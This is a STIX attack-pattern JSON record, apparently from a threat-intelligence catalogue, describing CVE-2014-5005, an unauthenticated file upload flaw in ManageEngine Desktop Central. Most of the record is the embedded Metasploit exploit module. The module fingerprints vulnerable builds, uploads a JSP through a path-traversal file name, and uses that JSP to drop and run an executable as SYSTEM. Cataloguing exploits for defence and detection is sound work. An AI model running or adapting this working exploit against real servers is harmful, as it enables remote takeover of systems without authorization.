{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--863a8766-eb58-42c6-8144-95be5d37c28c",
    "created": "2024-08-14T16:54:53.107813Z",
    "modified": "2024-08-14T16:54:53.107816Z",
    "name": "ManageEngine Desktop Central StatusUpdate Arbitrary File Upload",
    "description": " This module exploits an arbitrary file upload vulnerability in ManageEngine DesktopCentral v7 to v9 build 90054 (including the MSP versions). A malicious user can upload a JSP file into the web root without authentication, leading to arbitrary code execution as SYSTEM. Some early builds of version 7 are not exploitable as they do not ship with a bundled Java compiler. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/desktopcentral_statusupdate_upload.rb",
            "external_id": "desktopcentral_statusupdate_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-5005"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2014/Aug/88"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ManageEngine Desktop Central StatusUpdate Arbitrary File Upload',\n      'Description'    => %q{\n        This module exploits an arbitrary file upload vulnerability in ManageEngine DesktopCentral\n        v7 to v9 build 90054 (including the MSP versions).\n        A malicious user can upload a JSP file into the web root without authentication, leading to\n        arbitrary code execution as SYSTEM. Some early builds of version 7 are not exploitable as\n        they do not ship with a bundled Java compiler.\n      },\n      'Author'         =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>'        # Vulnerability discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2014-5005'],\n          ['OSVDB', '110643'],\n          ['URL', 'https://seclists.org/fulldisclosure/2014/Aug/88']\n        ],\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'Targets'        =>\n        [\n          [ 'Desktop Central v7 to v9 build 90054 / Windows', {} ]\n        ],\n      'Privileged'     => true,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-08-31'\n    ))\n\n    register_options([Opt::RPORT(8020)])\n  end\n\n\n  # Test for Desktop Central\n  def check\n    res = send_request_cgi({\n                               'uri' => normalize_uri(\"configurations.do\"),\n                               'method' => 'GET'\n                           })\n\n    if res && res.code == 200\n      build = nil\n\n      if res.body.to_s =~ /ManageEngine Desktop Central 7/ ||\n          res.body.to_s =~ /ManageEngine Desktop Central MSP 7/     # DC v7\n\n        print_status(\"Detected Desktop Central v7\")\n      elsif res.body.to_s =~ /ManageEngine Desktop Central 8/ ||\n          res.body.to_s =~ /ManageEngine Desktop Central MSP 8/\n\n        if res.body.to_s =~ /id=\"buildNum\" value=\"([0-9]+)\"\\/>/  # DC v8 (later versions)\n          build = $1\n          print_status(\"Detected Desktop Central v8 #{build}\")\n        else                                                     # DC v8 (earlier versions)\n          print_status(\"Detected Desktop Central v8\")\n        end\n      elsif res.body.to_s =~ /id=\"buildNum\" value=\"([0-9]+)\"\\/>/ # DC v9 (and higher?)\n        build = $1\n      end\n\n      if build.nil?\n        return Exploit::CheckCode::Unknown\n      elsif Rex::Version.new(build) < Rex::Version.new(\"90055\")\n        return Exploit::CheckCode::Appears\n      else\n        return Exploit::CheckCode::Safe\n      end\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    print_status(\"Uploading JSP to execute the payload\")\n\n    exe = payload.encoded_exe\n    exe_filename = rand_text_alpha_lower(8) + \".exe\"\n\n    jsp_payload = jsp_drop_and_execute(exe, exe_filename)\n    jsp_name = rand_text_alpha_lower(8) + \".jsp\"\n\n    send_request_cgi({\n      'uri'       => normalize_uri('statusUpdate'),\n      'method'    => 'POST',\n      'data'      => jsp_payload,\n      'ctype'     => 'text/html',\n      'vars_get'  => {\n        'actionToCall'  => 'LFU',\n        'configDataID'  => '1',\n        'customerId'    => rand_text_numeric(4),\n        'fileName'      => '../' * 6 << jsp_name\n      }\n    })\n    # We could check for HTTP 200 and a \"success\" string.\n    # However only some later v8 and v9 versions return this; and we don't really care\n    # and do a GET to the file we just uploaded anyway.\n\n    register_files_for_cleanup(exe_filename)\n    register_files_for_cleanup(\"..\\\\webapps\\\\DesktopCentral\\\\#{jsp_name}\")\n\n    print_status(\"Executing payload\")\n    send_request_cgi(\n    {\n      'uri'    => normalize_uri(jsp_name),\n      'method' => 'GET'\n    })\n  end\n\n\n  def jsp_drop_bin(bin_data, output_file)\n    jspraw =  %Q|<%@ page import=\"java.io.*\" %>\\n|\n    jspraw << %Q|<%\\n|\n    jspraw << %Q|String data = \"#{Rex::Text.to_hex(bin_data, \"\")}\";\\n|\n\n    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream(\"#{output_file}\");\\n|\n\n    jspraw << %Q|int numbytes = data.length();\\n|\n\n    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\\n|\n    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\\n|\n    jspraw << %Q|{\\n|\n    jspraw << %Q|  char char1 = (char) data.charAt(counter);\\n|\n    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\\n|\n    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\\n|\n    jspraw << %Q|  comb <<= 4;\\n|\n    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\\n|\n    jspraw << %Q|  bytes[counter/2] = (byte)comb;\\n|\n    jspraw << %Q|}\\n|\n\n    jspraw << %Q|outputstream.write(bytes);\\n|\n    jspraw << %Q|outputstream.close();\\n|\n    jspraw << %Q|%>\\n|\n\n    jspraw\n  end\n\n\n  def jsp_execute_command(command)\n    jspraw =  %Q|\\n|\n    jspraw << %Q|<%\\n|\n    jspraw << %Q|Runtime.getRuntime().exec(\"#{command}\");\\n|\n    jspraw << %Q|%>\\n|\n\n    jspraw\n  end\n\n\n  def jsp_drop_and_execute(bin_data, output_file)\n    jsp_drop_bin(bin_data, output_file) + jsp_execute_command(output_file)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-08-31",
    "x_mitre_platforms": [
        "win'"
    ]
}